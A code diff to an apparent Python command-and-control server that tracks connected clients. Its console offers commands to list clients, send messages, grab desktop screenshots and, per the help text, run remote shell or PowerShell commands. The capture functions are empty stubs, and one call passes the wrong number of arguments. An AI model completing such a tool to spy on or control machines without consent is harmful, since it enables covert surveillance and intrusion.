@@ -5,6 +5,10 @@ import threading
 # Threads is used to run multiple I/O-bound tasks simultaneously, here, requests
 # https://docs.python.org/3/library/threading.html 
 
+# Global dic to track connected and their socket
+# Needs to be refactored, Explore the Reactor Pattern in the future
+connected_clients = {}
+
 
 # Override class socketserver.BaseRequestHandler : https://docs.python.org/3/library/socketserver.html#socketserver.BaseRequestHandler
 class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
@@ -15,11 +19,12 @@ class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
 
     def setup(self) :
         print(f'New client connection : {self.client_address}')
+        connected_clients[self.client_address] = self.request
+
         print(f'Threads alive : {threading.active_count()}')
 
 
     def handle(self):
-
         if (self.client_address[0] not in WHITE_LIST) :
             print('IP not in the WhiteList')
             return
@@ -37,6 +42,7 @@ class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
 
     def finish(self) :
         print(f'Connection closed for: {self.client_address}')
+        del connected_clients[self.client_address]
 
 # The threaded version let multiple clients connect at the same time.
 # They can both communicate in a continuous Stream
@@ -69,7 +75,11 @@ def central_commands():
             if command[0] == 'help':
                 list_commands_available()
             elif command[0] == 'list':
-                print_clients(server)
+                print_clients()
+            elif command[0] == 'send_echo':
+                send_echo(command)
+            elif command[0] == 'get_SC':
+                get_SC(command)
 
     except KeyboardInterrupt:
         print('Central commands terminated')
@@ -80,12 +90,24 @@ def list_commands_available():
     print('list : To list clients connected to the server')
     print('send_echo [clientIP@port] [messageIn""]')
     print('get_SC [clientIP@port] : Get a ScreenShot of the client Desktop')
-    # print('send_pw_command')
+    print('shell [clientIP@port] [\'Shell Command\'] : Send a Shell/Powershell command to the client')
 
 
-def print_clients(server):
-    # print threads for now
-    print(f'Threads : {threading.active_count()}')
+def print_clients():
+    if len(connected_clients) == 0: 
+        print('No clients connected')
+    else :
+        print('Clients : ')
+        for client in connected_clients:
+            print(client)
+
+
+def send_echo(client, msg):
+    pass
+
+
+def get_SC(client):
+    pass
 
 
 if __name__ == '__main__':
